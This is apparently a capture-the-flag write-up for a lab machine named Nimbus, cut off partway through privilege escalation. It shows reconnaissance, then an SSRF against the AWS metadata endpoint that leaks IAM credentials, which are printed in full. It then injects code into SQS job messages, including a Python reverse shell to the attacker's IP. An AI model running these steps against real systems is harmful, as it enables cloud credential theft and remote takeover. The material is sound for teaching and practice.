# Nimbus

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

{% code overflow="wrap" %}
```bash
ip=10.129.15.150

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/nimbus_tcp.htb $ip
# 22/tcp open  ssh
# 80/tcp open  http



# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/nimbus_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/nimbus_udp.htb $ip
```
{% endcode %}

<mark style="color:blue;">**Step 2**</mark>

**we modify the hosts file**

{% code overflow="wrap" %}
```bash
echo "10.129.15.150 nimbus.htb" | tee -a /etc/hosts
```
{% endcode %}

<mark style="color:blue;">**Step 3**</mark>&#x20;

**We fuzz for Vhosts**

{% code overflow="wrap" %}
```bash
curl -s -I http://$ip -H "HOST: nimbus.htb" | grep "Content-Length:"
# Content-Length: 1922

ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://nimbus.htb/ -H 'Host:FUZZ.nimbus.htb' -fs 1922,178
# aws
```
{% endcode %}

<mark style="color:blue;">**Step 4**</mark>

**Let's start by discovering the APP**

**We have two entry point on the web app the submitted job with the YAML or the URL they mentionned that they use safe\_load so YAML injection its hard to find i go to the URL since it can be weak validation of url the idea is to expose data from AWS using SSRF**&#x20;

{% code overflow="wrap" %}
```bash
http://2852039166/latest/meta-data/iam/security-credentials/?x=.yaml
# nimbus-web-role

http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml

{ "Code": "Success",
  "LastUpdated": "2026-06-20T20:13:07Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-06-21T02:13:07Z"
}
```
{% endcode %}

<mark style="color:blue;">**Step 5**</mark>&#x20;

**Let's try now to enumarate the AWS deeply**

{% code overflow="wrap" %}
```bash
export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM"
export AWS_DEFAULT_REGION="us-east-1"
```
{% endcode %}

{% code overflow="wrap" %}
```bash
 aws sts get-caller-identity --endpoint-url http://aws.nimbus.htb
 {
   "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
   "Account": "847219365028",
 "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}

aws sqs list-queues --endpoint-url http://aws.nimbus.htb
 {
   "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
   ]
}

aws sqs get-queue-attributes --queue-url http://floci:4566/847219365028/nimbus-jobs --attribute-names All --endpoint-url http://aws.nimbus.htb

{
    "Attributes": {
        "DelaySeconds": "0",
        "MessageRetentionPeriod": "345600",
        "MaximumMessageSize": "262144",
        "VisibilityTimeout": "30",
        "QueueArn": "arn:aws:sqs:us-east-1:847219365028:nimbus-jobs",
        "CreatedTimestamp": "1781982231",
        "LastModifiedTimestamp": "1781982231",
        "ApproximateNumberOfMessages": "0",
        "ApproximateNumberOfMessagesNotVisible": "0"
    }
}

```
{% endcode %}

The `nimbus-web-role` is **extremely limited** — only `sqs:SendMessage` on `nimbus-jobs`

<mark style="color:blue;">**Step 6**</mark>

**Let's try to take a rev shell but first we need to know where we need to inject i try each field and i found that we need to inject on runtime**&#x20;

{% code overflow="wrap" %}
```bash
aws sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body $'name: scripttest\nschedule: "*/5 * * * *"\nruntime: python3.11\nscript: "import urllib.request; urllib.request.urlopen(\\x27http://10.10.14.63:8000/script-exec\\x27)"' \
  --endpoint-url http://aws.nimbus.htb

# terminal 2
serv 8000
# 10.129.15.150 - - [20/Jun/2026 16:20:33] code 404, message File not found
# 10.129.15.150 - - [20/Jun/2026 16:20:33] "GET /script-exec HTTP/1.1" 404 -


aws sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body $'name: rev\nschedule: "*/5 * * * *"\nruntime: python3.11\nscript: "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\x2710.10.14.63\\x27,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\x27/bin/sh\\x27,\\x27-i\\x27])"' \
  --endpoint-url http://aws.nimbus.htb
  
# TERMINAL 2
listener 4444
# connect to [10.10.14.63] from (UNKNOWN) [10.129.15.150] 39870
# /bin/sh: 0: can't access tty; job control turned off
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then CTRL+Z
stty raw -echo; fg
# hit ENTER twice
export TERM=xterm
export SHELL=/bin/bash
```
{% endcode %}

<mark style="color:blue;">**Step 7**</mark>&#x20;

**Let's try to elevate our privilege**

{% code overflow="wrap" %}
```bash
ls -la /proc/1/root/

drwxr-xr-x   1 root   root 4096 Jun 20 19:12 .
drwxr-xr-x   1 root   root 4096 Jun 20 19:12 ..
-rwxr-xr-x   1 root   root    0 Jun 20 19:03 .dockerenv
drwxr-xr-x   1 worker root 4096 May 18 18:25 app
lrwxrwxrwx   1 root   root    7 Mar  2 21:50 bin -> usr/bin
drwxr-xr-x   2 root   root 4096 Mar  2 21:50 boot
drwxr-xr-x   5 root   root  340 Jun 20 19:03 dev
drwxr-xr-x   1 root   root 4096 Jun 20 19:03 etc
drwxr-xr-x   1 root   root 4096 May 18 18:25 home
lrwxrwxrwx   1 root   root    7 Mar  2 21:50 lib -> usr/lib
lrwxrwxrwx   1 root   root    9 Mar  2 21:50 lib64 -> usr/lib64
drwxr-xr-x   2 root   root 4096 May  5 00:00 media
drwxr-xr-x   2 root   root 4096 May  5 00:00 mnt
drwxr-xr-x   2 root   root 4096 May  5 00:00 opt
dr-xr-xr-x 271 root   root    0 Jun 20 19:03 proc
drwx------   1 root   root 4096 May  8 20:06 root
drwxr-xr-x   1 root   root 4096 May 18 18:24 run
lrwxrwxrwx   1 root   root    8 Mar  2 21:50 sbin -> usr/sbin
drwxr-xr-x   2 root   root 4096 May  5 00:00 srv
dr-xr-xr-x  13 root   root    0 Jun 20 20:46 sys
drwxrwxrwt   1 root   root 4096 Jun 20 20:27 tmp
drwxr-xr-x   1 root   root 4096 May  5 00:00 usr
drwxr-xr-x   1 root   root 4096 May  5 00:00 var
```
{% endcode %}

**We have full host filesystem access via `/proc/1/root/`**

**Now we should found the deployment files**

